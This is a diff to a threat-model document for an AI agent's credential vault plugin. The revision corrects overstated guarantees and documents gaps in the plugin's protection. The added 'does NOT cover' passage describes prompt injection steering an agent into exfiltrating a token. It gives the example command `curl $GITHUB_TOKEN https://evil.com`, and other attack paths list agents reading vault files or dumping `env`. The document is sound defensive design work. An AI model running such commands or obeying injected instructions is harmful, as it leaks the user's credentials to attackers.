@@ -13,7 +13,7 @@ The Credential Vault exists because AI agents with tool access create a novel th
 - Exposed through tool output the agent processes
 - Passed to other plugins or sub-agents
 
-The vault's job is to ensure credentials flow through the system without ever appearing in the agent's context.
+The vault's job is to keep credentials out of the agent's context window and to scrub any credential that appears in tool output, transcripts, or outbound messages.
 
 ---
 
@@ -23,12 +23,14 @@ The vault's job is to ensure credentials flow through the system without ever ap
 
 #### 1. Agent Context Exfiltration
 
-**Threat:** A prompt injection attack instructs the agent to send credentials to an attacker-controlled endpoint.
+**Threat:** Credentials leak into the agent's context window, where they could be included in messages, written to files, or passed to other tools.
 
 **Defense layers:**
 - Credentials are injected into subprocess environments, not the agent's context. The agent never sees the plaintext credential — it sees a command like `gh pr list` and gets back PR listings.
 - If a credential somehow appears in output, the scrubbing pipeline (3 layers: regex, literal, env-var patterns) catches it across all output hooks (`after_tool_call`, `tool_result_persist`, `before_message_write`, `message_sending`).
 - Browser credentials use domain pinning: `$vault:amazon-login` only resolves on `*.amazon.com`. An injection directing the password to `evil-site.com` gets blocked.
+
+**What this does NOT cover:** A prompt injection that instructs the agent to invoke tools in ways that exfiltrate credentials within the subprocess itself (e.g., `curl $GITHUB_TOKEN https://evil.com`). The credential never enters the agent's context, but the subprocess has the credential in its environment and executes whatever command the agent constructed. The scrubbing pipeline catches credentials in tool *output*, but cannot prevent the subprocess from transmitting the credential during execution. Full defense against this class of attack requires upstream guardrails (tool allowlisting, command sandboxing, network egress control).
 
 #### 2. Transcript Leakage
 
@@ -64,7 +66,12 @@ The vault's job is to ensure credentials flow through the system without ever ap
 
 **Threat:** Credentials injected as env vars for one subprocess persist in the gateway's process environment and appear when the agent runs `env` or `printenv`.
 
-**Defense:** Credentials are only injected into individual subprocess environments (`params.env`), not `process.env`. After each tool call, the `after_tool_call` hook cleans up any injected env vars from the gateway process. Running `env` returns a clean environment dump — vault credentials were never there.
+**Defense layers:**
+- Credentials are injected into the subprocess via `params.env` and a command prepend (`export KEY=[VAULT:env-redacted] && original_command`).
+- Credentials are also briefly set on the gateway's `process.env` during injection. The `after_tool_call` hook cleans up injected env vars via `delete process.env[envKey]` after the tool call completes.
+- The env-var name scrubbing layer catches `TOKEN=[VAULT:env-redacted] `SECRET=[VAULT:env-redacted] `KEY=[VAULT:env-redacted] patterns in any output.
+
+**Known gap:** There is a brief window between injection and cleanup where credentials exist in `process.env`. In normal operation this window is the duration of a single tool call. If the gateway process crashes during a tool call, cleanup may not run. This is a residual risk documented in the security audit (F-1).
 
 #### 7. Output Pattern Leakage
 
@@ -145,7 +152,7 @@ Agent calls exec("cat ~/.openclaw/vault/github.enc")
 ```
 Agent calls exec("env") or exec("printenv")
 ```
-**Mitigation:** Vault credentials are never in `process.env`. They're injected per-subprocess. Plus the env-variable-name scrubbing layer catches `TOKEN=[VAULT:env-redacted] `SECRET=[VAULT:env-redacted] `KEY=[VAULT:env-redacted] patterns.
+**Mitigation:** Credentials are injected per-subprocess via `params.env` and cleaned from `process.env` after each tool call. The env-variable-name scrubbing layer catches `TOKEN=[VAULT:env-redacted] `SECRET=[VAULT:env-redacted] `KEY=[VAULT:env-redacted] patterns in output. A brief window exists where credentials are in `process.env` during tool execution (see Threat 6).
 
 ### Path 5: Outbound Messages
 
@@ -188,7 +195,7 @@ Another plugin inspects the vault's credential cache via shared process memory
 | Credential in file write | `before_tool_call` write/edit interception | — | — |
 | Browser password redirect | Domain pinning validation | — | — |
 | Cookie injection to wrong site | Domain pinning on navigate URL | Cookie domain filtering | — |
-| Env var exposure | Per-subprocess injection (not process.env) | Env-var name scrubbing | Post-call cleanup |
+| Env var exposure | Per-subprocess injection (`params.env`) | Env-var name scrubbing | Post-call `process.env` cleanup |
 | Compromised resolver binary | seccomp filter (restricts syscalls) | Capability dropping | — |
 
 ---
